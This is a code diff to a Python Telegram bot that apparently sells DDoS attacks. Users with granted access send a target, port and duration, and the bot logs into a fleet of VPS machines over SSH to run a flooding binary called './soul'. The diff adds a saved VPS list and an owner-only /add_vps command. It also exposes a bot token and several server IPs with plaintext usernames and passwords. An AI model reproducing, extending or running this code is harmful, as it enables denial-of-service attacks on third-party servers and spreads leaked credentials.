@@ -20,18 +20,30 @@ logging.basicConfig(level=logging.INFO)
 MAX_ATTACK_DURATION = 240
 USER_ACCESS_FILE = "user_access.txt"
 ATTACK_LOG_FILE = "attack_log.txt"
+VPS_FILE = "vps_list.json"
 OWNER_ID = "6598149418"
 bot = telebot.TeleBot('8018452264:AAFp8lsBlZ7GI8rdKNzGeQcqIfUhgyitMXo')
 
-vps_list = [
-    {"ip": "65.20.70.198", "user": "master_mbnctmgpjj", "pass": "jssZ92MddczG"},
-    {"ip": "157.245.106.235", "user": "master_sympfvcjnr", "pass": "j983URh4HZDK"},
-    {"ip": "159.65.155.247", "user": "master_yydznrgycm", "pass": "xPg9tbtjfnE2"},
-    {"ip": "143.110.181.25", "user": "master_kyzpmyacyh", "pass": "BvTwxDPF3jCd"},
-    {"ip": "64.227.164.0", "user": "master_ajtsdszfcj", "pass": "DJcMV2MFQ33y"},
-    {"ip": "64.227.167.67", "user": "master_vqqahptdae", "pass": "48zuz4AZ3XTR"},
-    {"ip": "139.59.63.135", "user": "master_cznykhvwqj", "pass": "jzk66JcCrYW7"}
-]
+def load_vps_list():
+    try:
+        with open(VPS_FILE, "r") as f:
+            return json.load(f)
+    except:
+        return [
+            {"ip": "65.20.70.198", "user": "master_mbnctmgpjj", "pass": "jssZ92MddczG"},
+            {"ip": "157.245.106.235", "user": "master_sympfvcjnr", "pass": "j983URh4HZDK"},
+            {"ip": "159.65.155.247", "user": "master_yydznrgycm", "pass": "xPg9tbtjfnE2"},
+            {"ip": "143.110.181.25", "user": "master_kyzpmyacyh", "pass": "BvTwxDPF3jCd"},
+            {"ip": "64.227.164.0", "user": "master_ajtsdszfcj", "pass": "DJcMV2MFQ33y"},
+            {"ip": "64.227.167.67", "user": "master_vqqahptdae", "pass": "48zuz4AZ3XTR"},
+            {"ip": "139.59.63.135", "user": "master_cznykhvwqj", "pass": "jzk66JcCrYW7"}
+        ]
+
+def save_vps_list():
+    with open(VPS_FILE, "w") as f:
+        json.dump(vps_list, f)
+
+vps_list = load_vps_list()
 
 def deploy_single_vps(vps):
     try:
@@ -58,7 +70,7 @@ def deploy_to_all_vps():
     for vps in vps_list:
         threading.Thread(target=deploy_single_vps, args=(vps,)).start()
 
-# Auto fresh deploy every time bot starts
+# Auto fresh deploy on every bot start
 deploy_to_all_vps()
 
 def remote_execute(vps, target, port, duration):
@@ -67,12 +79,11 @@ def remote_execute(vps, target, port, duration):
         ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
         ssh.connect(vps['ip'], username=vps['user'], password=vps['pass'], timeout=10)
         
-        # Binary runs instantly with exact command you want
         command = f"cd \~/Clodways && nohup timeout {duration}s ./soul {target} {port} {duration} > /dev/null 2>&1 &"
         
         ssh.exec_command(command)
         ssh.close()
-        logging.info(f"✅ Attack launched instantly on {vps['ip']}: ./soul {target} {port} {duration}")
+        logging.info(f"✅ Attack launched instantly on {vps['ip']}")
     except Exception as e:
         logging.error(f"SSH Error on {vps['ip']}: {e}")
 
@@ -358,6 +369,24 @@ def deploy_command(message):
     deploy_to_all_vps()
     bot.reply_to(message, "✅ Fresh deployment started on all VPS.")
 
+@bot.message_handler(commands=['add_vps'])
+def add_vps_command(message):
+    if str(message.from_user.id) != OWNER_ID:
+        bot.reply_to(message, "❌ Only owner can add VPS.")
+        return
+    command = message.text.split()
+    if len(command) != 4:
+        bot.reply_to(message, "Usage: `/add_vps <ip> <username> <password>`")
+        return
+    ip = command[1]
+    user = command[2]
+    password = command[3]
+    new_vps = {"ip": ip, "user": user, "pass": password}
+    vps_list.append(new_vps)
+    save_vps_list()
+    bot.reply_to(message, f"✅ VPS {ip} added. Deploying now...")
+    threading.Thread(target=deploy_single_vps, args=(new_vps,)).start()
+
 @bot.message_handler(commands=['stop_all'])
 def stop_all_command(message):
     caller_id = str(message.from_user.id)
@@ -434,10 +463,8 @@ def handle_bgmi(message):
         f"🚀 **Launching instantly on {len(vps_list)} VPS**\n🎯 Target: `{target}`\n📡 Port: `{port}`\n⏳ Duration: `{duration} seconds`",
         parse_mode='Markdown'
     )
-    # INSTANT PARALLEL LAUNCH ON ALL VPS
     with ThreadPoolExecutor(max_workers=len(vps_list)) as executor:
         executor.map(lambda v: remote_execute(v, target, port, duration), vps_list)
-
     log_attack(caller_id, target, port, duration)
     msg = bot.send_animation(
         chat_id=message.chat.id,
@@ -489,7 +516,8 @@ def help_command(message):
 • /start - Welcome message
 • /help - This help
 • /bgmi <target> <port> <duration> - Launch attack
-• /deploy - Force re-deploy Clodways (Owner only)
+• /add_vps <ip> <username> <password> - Add new VPS (Owner only)
+• /deploy - Force re-deploy all VPS (Owner only)
 • /stop_all - Stop all attacks (Owner only)
 • /when - Show active attacks
 • /grant <user_id> <duration> - Grant access (Owner only)
@@ -503,7 +531,6 @@ def help_command(message):
 
 Threads fixed at 900.
 Owner can use any port.
-Binary launches instantly on all VPS.
     """
     bot.reply_to(message, help_text)
 
